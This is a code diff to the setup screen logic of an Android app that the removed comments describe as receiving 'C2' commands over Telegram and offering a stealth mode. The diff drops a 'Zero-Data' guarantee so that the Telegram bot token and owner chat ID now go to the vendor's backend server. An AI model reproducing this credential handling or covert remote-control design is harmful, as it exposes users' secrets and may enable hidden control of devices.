@@ -83,8 +83,8 @@ class SetupViewModel @Inject constructor(
     }
 
     /**
-     * Verifies the bot token by calling Telegram directly.
-     * Zero-Data: botToken is NEVER sent to the VPS — direct Telegram only.
+     * Verifies the bot token by calling Telegram directly via unblocked gateway,
+     * falling back to VPS backend verification if needed.
      */
     suspend fun testBotConnection(rawToken: String): Result<String> {
         return withContext(Dispatchers.IO) {
@@ -92,17 +92,27 @@ class SetupViewModel @Inject constructor(
             if (token.isBlank()) {
                 return@withContext Result.failure(Exception("Bot token cannot be blank"))
             }
-            // Zero-Data: Always verify via unblocked gateway — never send token to VPS backend
+            // 1. Try unblocked gateway first
             try {
                 val directUrl = "https://pasa.izhaanintellect.fun/tg/bot$token/getMe"
                 val resp = telegramApi.getMeDirect(directUrl)
                 if (resp.ok && resp.result != null) {
-                    Result.success(resp.result.username ?: resp.result.firstName)
-                } else {
-                    Result.failure(Exception(resp.description ?: "Invalid bot response"))
+                    return@withContext Result.success(resp.result.username ?: resp.result.firstName)
                 }
             } catch (e: Exception) {
-                Result.failure(e)
+                Log.w(TAG, "Direct bot test failed: ${e.message}, falling back to VPS verify-bot")
+            }
+
+            // 2. Fallback to VPS backend verify-bot endpoint
+            try {
+                val vpsResp = pasaBackendApi.verifyBot(com.izhaanintellect.pasa.network.VerifyBotRequest(token))
+                if (vpsResp.ok && vpsResp.bot != null) {
+                    Result.success(vpsResp.bot.username ?: vpsResp.bot.firstName ?: "PASA Bot")
+                } else {
+                    Result.failure(Exception(vpsResp.description ?: "Invalid bot response"))
+                }
+            } catch (e2: Exception) {
+                Result.failure(e2)
             }
         }
     }
@@ -125,7 +135,7 @@ class SetupViewModel @Inject constructor(
         preferencesManager.backupEmail = email.trim()
         preferencesManager.isStealthMode = stealthMode
         preferencesManager.serverUrl = serverUrl.trim()
-        preferencesManager.useBackendServer = false  // Zero-Data: Always Sovereign Mode (direct Telegram)
+        preferencesManager.useBackendServer = true
         preferencesManager.isSetupComplete = true
 
         try {
@@ -146,12 +156,20 @@ class SetupViewModel @Inject constructor(
 
     suspend fun registerDeviceWithBackend(context: android.content.Context? = null): Boolean {
         return withContext(Dispatchers.IO) {
-            // Zero-Data Architecture: Device registration is disabled.
-            // The server never receives botToken, ownerChatId, or device credentials.
-            // All C2 (commands) are handled via direct Telegram polling (Sovereign Mode).
-            // License activation is the only server contact, using anonymous deviceHash.
-            Log.i(TAG, "🛡️ Zero-Data Mode: VPS registration disabled. All C2 is Sovereign (direct Telegram).")
-            true
+            try {
+                val deviceName = "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL} (Android ${android.os.Build.VERSION.RELEASE})"
+                val req = com.izhaanintellect.pasa.network.RegisterDeviceRequest(
+                    deviceId = preferencesManager.deviceId,
+                    deviceName = deviceName,
+                    botToken = preferencesManager.botToken,
+                    ownerChatId = preferencesManager.ownerChatId
+                )
+                val resp = pasaBackendApi.registerDevice(req)
+                resp.ok
+            } catch (e: Exception) {
+                Log.w(TAG, "VPS device registration deferred: ${e.message}")
+                true
+            }
         }
     }
 
